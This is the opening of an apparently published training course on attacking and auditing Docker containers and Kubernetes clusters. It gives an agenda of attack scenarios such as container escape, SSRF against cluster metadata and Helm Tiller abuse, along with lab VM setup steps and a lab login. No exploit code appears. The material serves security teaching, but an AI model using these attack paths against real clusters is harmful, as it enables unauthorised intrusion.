<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Attacking and Auditing Docker Containers and Kubernetes Clusters</title>
        
        <meta name="robots" content="noindex" />
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Appsecco training course content on Attacking and Auditing Dockers Containers and Kubernetes Clusters">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Welcome</a></li><li class="expanded "><a href="intro/index.html"><strong aria-hidden="true">2.</strong> Introduction</a></li><li><ol class="section"><li class="expanded "><a href="intro/disclaimer.html"><strong aria-hidden="true">2.1.</strong> Disclaimer</a></li><li class="expanded "><a href="intro/agenda.html"><strong aria-hidden="true">2.2.</strong> Agenda</a></li></ol></li><li class="expanded "><a href="environment-setup/index.html"><strong aria-hidden="true">3.</strong> Environment Setup</a></li><li><ol class="section"><li class="expanded "><a href="environment-setup/importing-virtualmachines.html"><strong aria-hidden="true">3.1.</strong> Importing Virtual Machines</a></li><li class="expanded "><a href="environment-setup/ssh-into-machine.html"><strong aria-hidden="true">3.2.</strong> SSH into machines from your host</a></li><li class="expanded "><a href="environment-setup/common-troublehshooting-steps.html"><strong aria-hidden="true">3.3.</strong> Common troubleshooting steps</a></li><li class="expanded "><a href="getting-started/internet-check.html"><strong aria-hidden="true">3.4.</strong> Internet Check</a></li></ol></li><li class="expanded "><a href="getting-started-with-docker/index.html"><strong aria-hidden="true">4.</strong> Getting started with docker</a></li><li><ol class="section"><li class="expanded "><a href="getting-started-with-docker/docker-run.html"><strong aria-hidden="true">4.1.</strong> docker run</a></li><li class="expanded "><a href="getting-started-with-docker/dockerfile.html"><strong aria-hidden="true">4.2.</strong> Dockerfile</a></li><li class="expanded "><a href="getting-started-with-docker/docker-management.html"><strong aria-hidden="true">4.3.</strong> docker management</a></li></ol></li><li class="expanded "><a href="advanced-concepts/index.html"><strong aria-hidden="true">5.</strong> Docker Advanced Concepts</a></li><li><ol class="section"><li class="expanded "><a href="advanced-concepts/docker-compoe-wordpress.html"><strong aria-hidden="true">5.1.</strong> docker-compose wordpress</a></li><li class="expanded "><a href="advanced-concepts/docker-volumes-and-networks.html"><strong aria-hidden="true">5.2.</strong> docker volumes and networks</a></li><li class="expanded "><a href="advanced-concepts/docker-swarm.html"><strong aria-hidden="true">5.3.</strong> docker swarm</a></li><li class="expanded "><a href="advanced-concepts/portainer.html"><strong aria-hidden="true">5.4.</strong> Portainer</a></li></ol></li><li class="expanded "><a href="attacking-insecure-volume-mounts/index.html"><strong aria-hidden="true">6.</strong> Attacking Insecure Volume Mounts</a></li><li><ol class="section"><li class="expanded "><a href="attacking-insecure-volume-mounts/scenario.html"><strong aria-hidden="true">6.1.</strong> Scenario</a></li><li class="expanded "><a href="attacking-insecure-volume-mounts/solution.html"><strong aria-hidden="true">6.2.</strong> Solution</a></li></ol></li><li class="expanded "><a href="attacking-docker-containers/index.html"><strong aria-hidden="true">7.</strong> Learning More</a></li><li><ol class="section"><li class="expanded "><a href="attacking-docker-containers/namespaces.html"><strong aria-hidden="true">7.1.</strong> Namespaces</a></li><li class="expanded "><a href="attacking-docker-containers/capabilities.html"><strong aria-hidden="true">7.2.</strong> Capabilities</a></li><li class="expanded "><a href="extra/control-groups.html"><strong aria-hidden="true">7.3.</strong> Control Groups</a></li></ol></li><li class="expanded "><a href="attacking-docker-misconfiguration/index.html"><strong aria-hidden="true">8.</strong> Attacking docker misconfiguration</a></li><li><ol class="section"><li class="expanded "><a href="attacking-docker-misconfiguration/scenario.html"><strong aria-hidden="true">8.1.</strong> Scenario</a></li><li class="expanded "><a href="attacking-docker-misconfiguration/solution.html"><strong aria-hidden="true">8.2.</strong> Solution</a></li></ol></li><li class="expanded "><a href="docker-image-audit/index.html"><strong aria-hidden="true">9.</strong> Auditing Docker containers and images</a></li><li><ol class="section"><li class="expanded "><a href="auditing-docker-containers/docker-images-containers.html"><strong aria-hidden="true">9.1.</strong> Docker images and containers</a></li><li class="expanded "><a href="docker-image-audit/scenario.html"><strong aria-hidden="true">9.2.</strong> Scenario</a></li><li class="expanded "><a href="docker-image-audit/solution.html"><strong aria-hidden="true">9.3.</strong> Solution</a></li></ol></li><li class="expanded "><a href="docker-volumes-and-networks/index.html"><strong aria-hidden="true">10.</strong> Auditing Docker networks and volumes</a></li><li><ol class="section"><li class="expanded "><a href="auditing-docker-containers/docker-volumes-networks.html"><strong aria-hidden="true">10.1.</strong> Docker volumes and networks</a></li><li class="expanded "><a href="docker-volumes-and-networks/scenario.html"><strong aria-hidden="true">10.2.</strong> Scenario</a></li><li class="expanded "><a href="docker-volumes-and-networks/solution.html"><strong aria-hidden="true">10.3.</strong> Solution</a></li></ol></li><li class="expanded "><a href="auditing-docker-containers/docker-integrity-check.html"><strong aria-hidden="true">11.</strong> Docker integrity checks</a></li><li class="expanded "><a href="auditing-docker-containers/amicontained.html"><strong aria-hidden="true">12.</strong> amicontained</a></li><li class="expanded "><a href="attacking-auditing-docker-registry/index.html"><strong aria-hidden="true">13.</strong> Attacking &amp; Auditing Docker Runtime &amp; Registries</a></li><li><ol class="section"><li class="expanded "><a href="auditing-docker-containers/docker-runtime-endpoints.html"><strong aria-hidden="true">13.1.</strong> Docker runtime endpoints</a></li><li class="expanded "><a href="attacking-auditing-docker-registry/docker-registries.html"><strong aria-hidden="true">13.2.</strong> Docker registries</a></li></ol></li><li class="expanded "><a href="attacking-containers-capabilities/index.html"><strong aria-hidden="true">14.</strong> Attacking container capabilities</a></li><li><ol class="section"><li class="expanded "><a href="attacking-containers-capabilities/scenario.html"><strong aria-hidden="true">14.1.</strong> Scenario</a></li><li class="expanded "><a href="attacking-containers-capabilities/solution.html"><strong aria-hidden="true">14.2.</strong> Solution</a></li></ol></li><li class="expanded "><a href="apparmor-nginx-profile/index.html"><strong aria-hidden="true">15.</strong> Linux Security Module: Apparmor</a></li><li class="expanded "><a href="exploiting-cluster-secrets/index.html"><strong aria-hidden="true">16.</strong> Attacking swarm cluster secrets</a></li><li><ol class="section"><li class="expanded "><a href="exploiting-cluster-secrets/scenario.html"><strong aria-hidden="true">16.1.</strong> Scenario</a></li><li class="expanded "><a href="exploiting-cluster-secrets/solution.html"><strong aria-hidden="true">16.2.</strong> Solution</a></li></ol></li><li class="expanded "><a href="attacking-private-registry/index.html"><strong aria-hidden="true">17.</strong> Attacking private registry images</a></li><li><ol class="section"><li class="expanded "><a href="attacking-private-registry/scenario.html"><strong aria-hidden="true">17.1.</strong> Scenario</a></li><li class="expanded "><a href="attacking-private-registry/solution.html"><strong aria-hidden="true">17.2.</strong> Solution</a></li></ol></li><li class="expanded "><a href="auditing-docker-containers/docker-bench-security-audit.html"><strong aria-hidden="true">18.</strong> Docker Bench security audit</a></li><li class="expanded "><a href="csm/index.html"><strong aria-hidden="true">19.</strong> Container Security Monitoring</a></li><li><ol class="section"><li class="expanded "><a href="docker-logging/index.html"><strong aria-hidden="true">19.1.</strong> Docker logging</a></li><li class="expanded "><a href="docker-events/index.html"><strong aria-hidden="true">19.2.</strong> Docker Events</a></li><li class="expanded "><a href="sysdig-faclo/index.html"><strong aria-hidden="true">19.3.</strong> Sysdig Faclo</a></li></ol></li><li class="expanded "><a href="getting-started/index.html"><strong aria-hidden="true">20.</strong> Kubernetes Environment Setup</a></li><li><ol class="section"><li class="expanded "><a href="getting-started/kubernetes-cluster-setup.html"><strong aria-hidden="true">20.1.</strong> Cluster Setup</a></li><li class="expanded "><a href="getting-started/import-vm.html"><strong aria-hidden="true">20.2.</strong> Import VM</a></li><li class="expanded "><a href="getting-started/configure-kubectl.html"><strong aria-hidden="true">20.3.</strong> Configure kubectl</a></li><li class="expanded "><a href="getting-started/vuln-apps.html"><strong aria-hidden="true">20.4.</strong> Vulnerable Apps</a></li></ol></li><li class="expanded "><a href="kubernetes-101/index.html"><strong aria-hidden="true">21.</strong> Getting Started with Kubernetes</a></li><li><ol class="section"><li class="expanded "><a href="kubernetes-101/children-guide.html"><strong aria-hidden="true">21.1.</strong> The Illustrated Children's Guide to Kubernetes</a></li><li class="expanded "><a href="kubernetes-101/introduction.html"><strong aria-hidden="true">21.2.</strong> Introduction to Kubernetes</a></li><li class="expanded "><a href="kubernetes-101/overview.html"><strong aria-hidden="true">21.3.</strong> Kubernetes Overview</a></li><li class="expanded "><a href="kubernetes-101/technical-terms.html"><strong aria-hidden="true">21.4.</strong> Understanding Kubernetes specific technical terms</a></li><li class="expanded "><a href="kubernetes-101/kubectl.html"><strong aria-hidden="true">21.5.</strong> kubectl usage for pentesters</a></li></ol></li><li class="expanded "><a href="deploy-app/index.html"><strong aria-hidden="true">22.</strong> Deploying simple application in Kubernetes Cluster</a></li><li><ol class="section"><li class="expanded "><a href="deploy-app/using-yaml.html"><strong aria-hidden="true">22.1.</strong> Using yaml manifest</a></li><li class="expanded "><a href="deploy-app/using-helm.html"><strong aria-hidden="true">22.2.</strong> Using helm chart</a></li></ol></li><li class="expanded "><a href="scenario-1/index.html"><strong aria-hidden="true">23.</strong> Scenario-1 - Exploiting Private Registry via Misconfiguration</a></li><li><ol class="section"><li class="expanded "><a href="scenario-1/scenario.html"><strong aria-hidden="true">23.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-1/solution.html"><strong aria-hidden="true">23.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-1/discussion.html"><strong aria-hidden="true">23.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="scenario-2/index.html"><strong aria-hidden="true">24.</strong> Scenario-2 - Attacking Kubernetes Cluster Metadata using SSRF vulnerability</a></li><li><ol class="section"><li class="expanded "><a href="scenario-2/scenario.html"><strong aria-hidden="true">24.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-2/solution.html"><strong aria-hidden="true">24.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-2/discussion.html"><strong aria-hidden="true">24.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="scenario-3/index.html"><strong aria-hidden="true">25.</strong> Scenario-3 - Testing for the sensitive configurations and secrets in Kubernetes cluster</a></li><li><ol class="section"><li class="expanded "><a href="scenario-3/scenario.html"><strong aria-hidden="true">25.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-3/solution.html"><strong aria-hidden="true">25.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-3/discussion.html"><strong aria-hidden="true">25.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="scenario-4/index.html"><strong aria-hidden="true">26.</strong> Scenario-4 - Docker escape using Pod Volume Mounts to access the nodes and host systems</a></li><li><ol class="section"><li class="expanded "><a href="scenario-4/scenario.html"><strong aria-hidden="true">26.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-4/solution.html"><strong aria-hidden="true">26.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-4/discussion.html"><strong aria-hidden="true">26.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="scenario-5/index.html"><strong aria-hidden="true">27.</strong> Scenario-5 - Attacking applications in different namespaces in Kubernetes cluster</a></li><li><ol class="section"><li class="expanded "><a href="scenario-5/scenario.html"><strong aria-hidden="true">27.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-5/solution.html"><strong aria-hidden="true">27.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-5/discussion.html"><strong aria-hidden="true">27.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="scenario-6/index.html"><strong aria-hidden="true">28.</strong> Scenario-6 - Attacking Helm tiller without RBAC setup</a></li><li><ol class="section"><li class="expanded "><a href="scenario-6/scenario.html"><strong aria-hidden="true">28.1.</strong> Scenario</a></li><li class="expanded "><a href="scenario-6/solution.html"><strong aria-hidden="true">28.2.</strong> Solution</a></li><li class="expanded "><a href="scenario-6/discussion.html"><strong aria-hidden="true">28.3.</strong> Discussion</a></li></ol></li><li class="expanded "><a href="kube-bench/index.html"><strong aria-hidden="true">29.</strong> Running kube-bench</a></li><li class="expanded "><a href="kubesec/index.html"><strong aria-hidden="true">30.</strong> Running kubesec</a></li><li class="expanded "><a href="kube-hunter/index.html"><strong aria-hidden="true">31.</strong> Running kube-hunter</a></li><li class="expanded "><a href="kubeaudit/index.html"><strong aria-hidden="true">32.</strong> Running kubeaudit</a></li><li class="expanded "><a href="logging-and-monitoring/index.html"><strong aria-hidden="true">33.</strong> Logging and Monitoring</a></li><li class="expanded "><a href="automated-defense/index.html"><strong aria-hidden="true">34.</strong> Automated Security Defense using Sysdig Falco</a></li><li class="expanded "><a href="demos/index.html"><strong aria-hidden="true">35.</strong> DEMO's</a></li><li><ol class="section"><li class="expanded "><a href="demos/cve-2018-1002105.html"><strong aria-hidden="true">35.1.</strong> CVE-2018-1002105</a></li><li class="expanded "><a href="demos/cve-2019-5736.html"><strong aria-hidden="true">35.2.</strong> CVE-2019-5736</a></li><li class="expanded "><a href="demos/cve-2019-9901.html"><strong aria-hidden="true">35.3.</strong> CVE-2019-9901</a></li></ol></li><li class="expanded "><a href="extra/index.html"><strong aria-hidden="true">36.</strong> Fun Learning About Kubernetes</a></li><li><ol class="section"><li class="expanded "><a href="extra/contianed-af.html"><strong aria-hidden="true">36.1.</strong> Contained.af</a></li><li class="expanded "><a href="extra/play-with-docker.html"><strong aria-hidden="true">36.2.</strong> Play with Docker</a></li><li class="expanded "><a href="extra/katacoda.html"><strong aria-hidden="true">36.3.</strong> Katacoda Docker Security</a></li><li class="expanded "><a href="extra/play-with-kubernetes.html"><strong aria-hidden="true">36.4.</strong> Play with Kubernetes</a></li></ol></li><li class="expanded "><a href="popular-attacks/index.html"><strong aria-hidden="true">37.</strong> Popular Attacks</a></li><li><ol class="section"><li class="expanded "><a href="popular-attacks/dockerhub-190k.html"><strong aria-hidden="true">37.1.</strong> Dockerhub 190k accounts</a></li><li class="expanded "><a href="popular-attacks/cryptojacking.html"><strong aria-hidden="true">37.2.</strong> Cryptojacking using public docker containers</a></li><li class="expanded "><a href="popular-attacks/dockerhub.html"><strong aria-hidden="true">37.3.</strong> Dockerhub known vulnerable images</a></li><li class="expanded "><a href="popular-attacks/service-token.html"><strong aria-hidden="true">37.4.</strong> BSidesSF CTF cluster pwn</a></li><li class="expanded "><a href="popular-attacks/metadata.html"><strong aria-hidden="true">37.5.</strong> Shopify metadata to cluster pwn</a></li></ol></li><li class="expanded "><a href="references-and-resources.html"><strong aria-hidden="true">38.</strong> References &amp; Resources</a></li><li class="expanded "><a href="terminology-glossary.html"><strong aria-hidden="true">39.</strong> Terminology Glossary</a></li><li class="spacer"></li><li class="expanded affix "><a href="about-us/about-appsecco.html">About Appsecco</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title">Attacking and Auditing Docker Containers and Kubernetes Clusters</h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p><img src="cover.jpg" alt="cover page" /></p>
<h1><a class="header" href="#introduction" id="introduction">Introduction</a></h1>
<p>Welcome to <strong>Attacking &amp; Auditing Docker Containers &amp; Kubernetes Clusters</strong> training.</p>
<ul>
<li>This attacker focused, hands on training will set you on path to understand common vulnerabilities in containerized environments (Docker) and get familiar with Kubernetes clusters</li>
<li>It will help you to learn the approach to follow and the process for testing and auditing containers and Kubernetes clusters</li>
<li>By the end of the training participants will able to identify and exploit applications running on containers inside Kubernetes clusters with a hands-on approach</li>
</ul>
<h2><a class="header" href="#abstract" id="abstract">Abstract</a></h2>
<p>An organisation using microservices or any other distributed architecture rely heavily on containers and container orchestration engines like Kubernetes and as such its infrastructure security is paramount to its business operations.</p>
<p>This course will set the base for security testers and DevOps teams to test for common security vulnerabilities and configuration weaknesses across containerised environments and distributed systems. It also helps to understand approach and process to audit the Kubernetes environment for security posture.</p>
<p>The courseware is meant to introduce participants to container and cluster management with Kubernetes.</p>
<ul>
<li>The focus is on the security aspects of application and the container infrastructure</li>
<li>The participants will learn the common tools and techniques that are used to attack applications running in containerized environments</li>
<li>The participants will be introduced to Kubernetes and learn to assess the attack surfaces applicable for a given application on the cluster</li>
<li>The participants will learn how to audit for security based on best practices using tools and custom scripts</li>
</ul>
<blockquote>
<p>As part of the course delivery, the trainer will share examples of real world security issues found in penetration testing engagements to showcase mapping of the concepts with what usually happens in the real world.</p>
</blockquote>
<h2><a class="header" href="#hardware-requirements" id="hardware-requirements">Hardware Requirements</a></h2>
<ul>
<li>At least 8 GB of RAM, 10GB of Diskspace free on the system</li>
<li>Laptop should support hardware-based virtualization
<ul>
<li>If your laptop can run a 64-bit virtual machine in Oracle VirtualBox it should work</li>
</ul>
</li>
<li>Network Connectivity or USB Ports for copying data</li>
<li>Trainer will provide the <strong>VM and dedicated Kubernetes cluster configuration</strong> for each student with administrative access to have a hand-on experience during the training</li>
</ul>
<h2><a class="header" href="#prerequisites" id="prerequisites">Prerequisites</a></h2>
<ul>
<li>Basic knowledge of using the Linux command line</li>
<li>System administration basics like servers, applications configuration and deployment</li>
<li>Familiarity with container environments like Docker and distributed systems would be useful</li>
</ul>
<h2><a class="header" href="#take-aways" id="take-aways">Take Aways</a></h2>
<ul>
<li>Complete hands-on training with a practical approach and real-world scenarios</li>
<li>Ebooks of the training covering all hands-on in a step by step guide (HTML, PDF, EPub, Mobi)</li>
<li>Git repository of all the custom source code, scripts, playbooks used during the training</li>
<li>Resources and references for further learning and practice</li>
</ul>
<h1><a class="header" href="#disclaimer" id="disclaimer">Disclaimer</a></h1>
<ul>
<li>The attacks covered in the training are for educational purposes only. Do not test or attack any system outside of the scope of this training lab unless you have express permission to do so</li>
<li>The snippets, commands and scripts used throughout the training are not production-ready, may not be bug-free and are not guaranteed in any way</li>
</ul>
<p><img src="intro/images/warning.png" alt="5 year jail term for hacking unauthorized computers and networks according to the Indian IT Act 2000" /></p>
<h1><a class="header" href="#attacking--auditing-docker-containers--kubernetes-clusters---agenda" id="attacking--auditing-docker-containers--kubernetes-clusters---agenda">Attacking &amp; Auditing Docker Containers &amp; Kubernetes Clusters - Agenda</a></h1>
<ul>
<li>Introduction
<ul>
<li>About the trainer</li>
<li>Disclaimer</li>
<li>Agenda</li>
</ul>
</li>
<li>Environment Setup
<ul>
<li>Importing Virtual Machines</li>
<li>SSH into machines from your host</li>
<li>Common troubleshooting steps</li>
</ul>
</li>
<li>Docker Quick start
<ul>
<li>docker run</li>
<li>Dockerfile</li>
<li>docker management</li>
</ul>
</li>
<li>Docker Advanced Concepts
<ul>
<li>docker-compose wordpress</li>
<li>docker volumes and networks</li>
<li>docker swarm</li>
<li>Portainer</li>
</ul>
</li>
<li>Attacking Insecure Volume Mounts
<ul>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Learning More about
<ul>
<li>Namespaces</li>
<li>Capabilities</li>
<li>Control Groups</li>
</ul>
</li>
<li>Attacking docker misconfiguration
<ul>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Auditing Docker containers and images
<ul>
<li>Docker images and containers</li>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Auditing Docker networks and volumes
<ul>
<li>Docker volumes and networks</li>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Docker integrity checks</li>
<li>amicontained - Introspection tool</li>
<li>Attacking &amp; Auditing Docker Runtime &amp; Registries
<ul>
<li>Docker runtime endpoints</li>
<li>Docker registries</li>
</ul>
</li>
<li>Attacking container capabilities
<ul>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Linux Security Module - Apparmor nginx profile</li>
<li>Attacking swarm cluster secrets
<ul>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Attacking private registry images
<ul>
<li>Scenario</li>
<li>Solution</li>
</ul>
</li>
<li>Docker bench security audit</li>
<li>Container Security Monitoring
<ul>
<li>Docker logging</li>
<li>Docker Events</li>
<li>Sysdig Faclo</li>
</ul>
</li>
<li>Kubernetes Environment Setup
<ul>
<li>Import VM</li>
<li>Internet Check</li>
<li>Configure kubectl</li>
</ul>
</li>
<li>Kubernetes 101
<ul>
<li>Getting Started with Kubernetes</li>
<li>Introduction to Kubernetes</li>
<li>Kubernetes Overview</li>
<li>The Illustrated Children's Guide to Kubernetes</li>
<li>Understanding Kubernetes specific technical terms</li>
<li>kubectl usage for pentesters</li>
</ul>
</li>
<li>Deploying simple application in Kubernetes Cluster
<ul>
<li>Using yaml manifest</li>
<li>Using helm chart</li>
</ul>
</li>
<li>Scenario-1 - Exploiting Private Registry via Misconfiguration
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Scenario-2 - Attacking Kubernetes Cluster Metadata using SSRF vulnerability
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Scenario-3 - Testing for the sensitive configurations and secrets in Kubernetes cluster
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Scenario-4 - Docker escape using Pod Volume Mounts to access the nodes and host systems
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Scenario-5 - Attacking applications in different namespaces in Kubernetes cluster
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Scenario-6 - Attacking Helm tiller without RBAC setup
<ul>
<li>Scenario</li>
<li>Solution</li>
<li>Discussion</li>
</ul>
</li>
<li>Auditing Kubernetes Clusters with CIS Benchmarks using kube-bench</li>
<li>Kubernetes resources security scoring using kubesec.io</li>
<li>Kube-hunter to do analysis of the cluster for security concerns</li>
<li>Kubeaudit to audit the cluster with detailed results</li>
<li>Logging and Monitoring for security events</li>
<li>Security checks for events using Sysdig Falco - Automated Defense (DEMO Only)</li>
<li>Advanced Scenario - Exploiting Kubernetes API Server Vulnerability CVE-2018-1002105 (DEMO Only)</li>
<li>Fun Learning About Kubernetes
<ul>
<li>Contained.af</li>
<li>Play with Docker</li>
<li>Katacoda Docker Security</li>
<li>Play with Kubernetes</li>
</ul>
</li>
<li>Popular Attacks
<ul>
<li>Dockerhub 190k accounts</li>
<li>Cryptojacking using public docker containers</li>
<li>Dockerhub known vulnerable images</li>
<li>BSidesSF CTF cluster pwn</li>
<li>Shopify metadata to cluster pwn</li>
</ul>
</li>
<li>References &amp; Resources</li>
</ul>
<h1><a class="header" href="#environment-setup" id="environment-setup">Environment Setup</a></h1>
<ul>
<li><a href="environment-setup/importing-virtualmachines.html">Importing Virtual Machines</a></li>
<li><a href="environment-setup/ssh-into-machine.html">SSH into machines from your host</a></li>
<li><a href="environment-setup/common-troublehshooting-steps.html">Common troubleshooting steps</a></li>
<li><a href="environment-setup/../getting-started/internet-check.html">Internet Check</a></li>
</ul>
<h1><a class="header" href="#importing-virtual-machines" id="importing-virtual-machines">Importing virtual machines</a></h1>
<p>The students need to import two virtual machines for docker labs</p>
<ol>
<li><code>docker-student.ova</code></li>
<li><code>docker-ctf.ova</code></li>
</ol>
<blockquote>
<p><strong>NOTE</strong>: In case of <code>VBOX_E_FILE_ERROR (0x80BB0004)</code> error during VM import, ensure you are importing a VM with file extension <code>.ova</code>.</p>
</blockquote>
<h2><a class="header" href="#download-vm" id="download-vm">Download VM</a></h2>
<table><thead><tr><th>VM Name</th><th>Source URL</th></tr></thead><tbody>
<tr><td>docker-student.ova</td><td>http://www.mediafire.com/file/3x1tgszet5blaz9/docker-student.ova.zip/file</td></tr>
<tr><td>docker-ctf.ova</td><td>http://www.mediafire.com/file/39e1w5wt7tmxr43/docker-ctf.ova/file</td></tr>
</tbody></table>
<p>The <code>checksums</code> are available at <code>http://www.mediafire.com/file/6xp3c7voy60zn1e/checksum.txt/file</code></p>
<h2><a class="header" href="#student-machine-docker-studentova" id="student-machine-docker-studentova">Student Machine (docker-student.ova)</a></h2>
<ul>
<li>Open VirtualBox, and select <code>File</code> -&gt; <code>Import Appliance</code> from the top menu</li>
</ul>
<p><img src="environment-setup/images/import-ova.png" alt="Importing student ova" /></p>
<ul>
<li>Select <code>docker-student.ova</code> file from the <code>workshop-content</code> folder</li>
</ul>
<p><img src="environment-setup/images/select-student-ova.png" alt="selecting student ova" /></p>
<ul>
<li>Check the &quot;Reintialize the MAC address of all network cards&quot; checkbox, and click on Next to import the ova file</li>
</ul>
<p><img src="environment-setup/images/student-ova-settings.png" alt="student ova settings" /></p>
<ul>
<li>Now we can see that ova file is importing</li>
</ul>
<p><img src="environment-setup/images/processing.png" alt="processing" /></p>
<ul>
<li>Use following credentials for <code>student</code> VM login</li>
</ul>
<pre><code class="language-bash">username: student
password: Docker@321
</code></pre>
<p><img src="environment-setup/images/student-vm-login.png" alt="student vm login" /></p>
<ul>
<li>Your IP address may differ from what is visible in the screenshot. Please note down this IP address for later use</li>
</ul>
<h2><a class="header" href="#ctf-machine-docker-ctfova" id="ctf-machine-docker-ctfova">CTF Machine (docker-ctf.ova)</a></h2>
<ul>
<li>Open VirtualBox, and select <code>File</code> -&gt; <code>Import Appliance</code> from the top menu</li>
</ul>
<p><img src="environment-setup/images/import-ova.png" alt="Importing ctf ova" /></p>
